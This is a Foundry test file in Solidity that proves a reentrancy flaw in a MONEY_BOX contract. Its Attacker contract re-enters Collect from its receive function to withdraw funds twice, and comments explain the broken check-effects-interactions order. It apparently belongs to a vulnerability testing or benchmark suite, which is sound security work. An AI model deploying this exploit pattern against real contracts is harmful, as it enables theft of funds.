
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {stdStorage, StdStorage} from "../lib/forge-std/src/StdStorage.sol";
import "../src/MONEY_BOX.sol";

contract TestReentrancyMONEY_BOX is Test {
    using stdStorage for StdStorage;

    MONEY_BOX public _contractUnderTest;
    Log public _log;
    Attacker public _attacker;

    function setUp() public {
        _log = new Log();
        _contractUnderTest = new MONEY_BOX();
        
        _contractUnderTest.SetLogFile(address(_log));
        _contractUnderTest.Initialized();

        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        vm.assume(attackVal > 0.1 ether && attackVal < 1000 ether);

        // We set MinSum to 2 * attackVal.
        // This creates a condition where the balance must be at least 2 * attackVal to withdraw.
        // By depositing 2 * attackVal, the first call passes.
        // Due to Reentrancy (Check-Effects-Interaction violation), the second call (re-entrant)
        // sees the old balance (2 * attackVal) and passes the MinSum check again.
        // If the contract were secure, the balance would update before the call, causing the 
        // second check (val >= 2*val) to fail.
        stdstore
            .target(address(_contractUnderTest))
            .sig("MinSum()")
            .checked_write(2 * attackVal);

        vm.deal(address(_contractUnderTest), 2 * attackVal); 
        vm.deal(address(this), 3 * attackVal);

        _attacker.setupAttack{value: 2 * attackVal}(attackVal);
        
        vm.warp(block.timestamp + 100);

        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    MONEY_BOX public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        _victim = MONEY_BOX(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        storedAttackVal = val;
        
        _victim.Put{value: 2 * val}(0);
    }

    function attack(uint256 val) public {
        _victim.Collect(val);

        if (attackCallCount > 1) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        attackCallCount++;
        if (attackCallCount < 2) {            
            _victim.Collect(storedAttackVal);
        }
    }
}
